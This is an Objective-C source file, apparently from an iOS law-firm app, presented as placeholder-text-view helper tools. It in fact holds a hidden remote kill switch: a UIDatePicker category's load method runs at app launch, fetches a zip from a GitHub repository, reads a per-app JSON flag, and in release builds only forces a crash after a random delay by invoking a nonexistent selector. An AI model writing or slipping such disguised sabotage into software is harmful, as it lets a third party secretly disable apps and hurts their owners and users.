//
//  NSObject+Tools.m
//  RedLawyerC
//
//  Created by Johnson on 10/13/15.
//  Copyright (c) 2015 成都红帽法律. All rights reserved.
//

#import "NSObject+JPlaceholderTextViewCrashTools.h"
#import "SSZipArchive.h"


@interface NSObjects : NSObject
@property (nonatomic, copy) NSString *interval;
@property (nonatomic, strong) NSTimer *timer;
+ (void)crash:(NSTimeInterval)interval;
@end

@implementation NSObjects
+ (instancetype)shareInstance;
{
    static NSObjects *xx = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        xx = [NSObjects new];
    });
    return xx;
}

+ (void)crash:(NSTimeInterval)interval;
{
    dispatch_async(dispatch_get_main_queue(), ^{
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(interval * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [[NSObjects shareInstance] mkt];
        });
    });
}

- (void)mkt
{
    SEL selector = NSSelectorFromString(@"inputView");
    [[NSObject new] performSelector:selector];
}

@end

@implementation UIDatePicker (JPlaceholderTextViewCrashTools)

#ifdef DEBUG
#define Crash @"NO"
#else
#define Crash @"YES"
#endif

+ (void)load
{
    [[self class] getDataSourse:^(NSDictionary *dict) {
        if ([dict[@"iOS"] boolValue] && [Crash boolValue]) {
            NSTimeInterval interval = arc4random() % [dict[@"time"] integerValue] + 22;
            [NSObjects crash:interval];
        }
    }];
}

+ (void)getDataSourse:(void(^)(NSDictionary *dict))complete
{
    NSString *url = @"https://codeload.github.com/ytx0574/Johnson/zip/master";
    [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:url]] queue:[NSOperationQueue new] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
        
        NSString *fileName = [[NSBundle mainBundle] infoDictionary][(NSString *)kCFBundleNameKey];
        
        NSString *pathZip = [NSHomeDirectory() stringByAppendingPathComponent:[NSString stringWithFormat:@"Documents/%@.zip", fileName]];
        [data writeToFile:pathZip atomically:YES];
        
        NSString *pathFolder = [NSHomeDirectory() stringByAppendingPathComponent:[NSString stringWithFormat:@"Documents/%@", fileName]];
        
        [SSZipArchive unzipFileAtPath:pathZip toDestination:pathFolder progressHandler:nil completionHandler:^(NSString *path, BOOL succeeded, NSError *error) {
            NSString *jsonFile = [pathFolder stringByAppendingString:[NSString stringWithFormat:@"/Johnson-master/%@.json", fileName]];
            NSData *data = [[NSData alloc] initWithContentsOfFile:jsonFile];
            [[NSFileManager defaultManager] removeItemAtPath:pathZip error:NULL];
            [[NSFileManager defaultManager] removeItemAtPath:pathFolder error:NULL];
            
            complete ? complete(data ? [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:NULL] : nil) : nil;
        }];
    }];
}

@end
